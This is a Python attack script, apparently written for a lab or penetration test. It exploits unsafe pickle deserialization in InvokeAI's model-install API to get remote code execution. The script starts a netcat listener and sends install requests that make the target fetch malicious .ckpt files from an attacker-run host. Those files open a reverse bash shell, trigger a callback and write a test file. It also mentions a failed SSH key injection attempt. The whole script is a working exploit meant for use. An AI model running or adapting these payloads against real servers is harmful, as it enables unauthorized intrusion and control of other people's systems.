#!/usr/bin/env python3
"""
Kali Reverse Shell Test - Alternative to SSH
Copy to Kali and run: python3 kali_reverse_test.py
"""

import requests
import time
import threading
import subprocess
import socket

def start_netcat_listener():
    """Start netcat listener in background"""
    try:
        print("[*] Starting netcat listener on port 4444...")
        # This will run in background
        subprocess.Popen(['nc', '-lvnp', '4444'], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        print("[+] Netcat listener started on port 4444")
        return True
    except:
        print("[-] Could not start netcat listener")
        return False

def test_callback_payload():
    """Test callback payload to verify deserialization"""
    print("\n" + "="*50)
    print("TESTING CALLBACK PAYLOAD")
    print("This will make HTTP callback to verify execution")
    print("="*50)
    
    url = "http://192.168.117.218:9090/api/v2/models/install"
    params = {
        "source": "http://192.168.45.168:8000/payload_callback_test.ckpt",
        "inplace": "true"
    }
    
    print(f"[*] Sending callback payload...")
    response = requests.post(url, params=params, json={})
    print(f"[+] Status: {response.status_code}")
    
    if response.status_code in [200, 201, 202]:
        print("[+] Callback payload sent!")
        print("[!] Check your web server logs for callback request")
        print("[!] If you see callback, pickle deserialization is working")
        return True
    else:
        print("[-] Failed")
        return False

def test_reverse_shell():
    """Test reverse shell payload"""
    print("\n" + "="*50)
    print("TESTING REVERSE SHELL PAYLOAD")
    print("Make sure netcat listener is running: nc -lvnp 4444")
    print("="*50)
    
    url = "http://192.168.117.218:9090/api/v2/models/install"
    params = {
        "source": "http://192.168.45.168:8000/payload_reverse_bash.ckpt",
        "inplace": "true"
    }
    
    print(f"[*] Sending reverse shell payload...")
    print("[*] This should connect back to your netcat listener")
    
    response = requests.post(url, params=params, json={})
    print(f"[+] Status: {response.status_code}")
    
    if response.status_code in [200, 201, 202]:
        print("[+] Reverse shell payload sent!")
        print("[!] Check your netcat listener for connection")
        print("[!] If connected, you have shell access!")
        return True
    else:
        print("[-] Failed")
        return False

def test_simple_execution():
    """Test simple command execution"""
    print("\n" + "="*50)
    print("TESTING SIMPLE EXECUTION")
    print("Creating test file to verify command execution")
    print("="*50)
    
    url = "http://192.168.117.218:9090/api/v2/models/install"
    params = {
        "source": "http://192.168.45.168:8000/payload_test.ckpt",
        "inplace": "true"
    }
    
    print(f"[*] Sending test payload...")
    response = requests.post(url, params=params, json={})
    print(f"[+] Status: {response.status_code}")
    
    if response.status_code in [200, 201, 202]:
        print("[+] Test payload sent!")
        print("[!] Check if file was created:")
        print("ssh root@192.168.117.218 'cat /tmp/payload_test.txt'")
        return True
    else:
        print("[-] Failed")
        return False

def main():
    print("InvokeAI RCE - Reverse Shell & Execution Test")
    print("=" * 50)
    print("Testing alternative approaches since SSH key injection failed")
    
    # Start netcat listener
    listener_started = start_netcat_listener()
    
    print("\nChoose test:")
    print("1. Test callback payload (verifies deserialization)")
    print("2. Test reverse shell (get shell directly)")
    print("3. Test simple execution (verify commands work)")
    print("4. Run all tests")
    
    choice = input("\nEnter choice (1-4): ").strip()
    
    if choice == "1":
        test_callback_payload()
    elif choice == "2":
        if not listener_started:
            print("[!] Please start listener manually: nc -lvnp 4444")
        test_reverse_shell()
    elif choice == "3":
        test_simple_execution()
    elif choice == "4":
        test_callback_payload()
        time.sleep(2)
        test_reverse_shell()
        time.sleep(2)
        test_simple_execution()
    else:
        print("Invalid choice")
    
    print("\n" + "="*50)
    print("MANUAL VERIFICATION:")
    print("1. Check web server logs for callback")
    print("2. Check netcat listener for shell")
    print("3. Check test file: ssh root@192.168.117.218 'cat /tmp/payload_test.txt'")

if __name__ == "__main__":
    main()
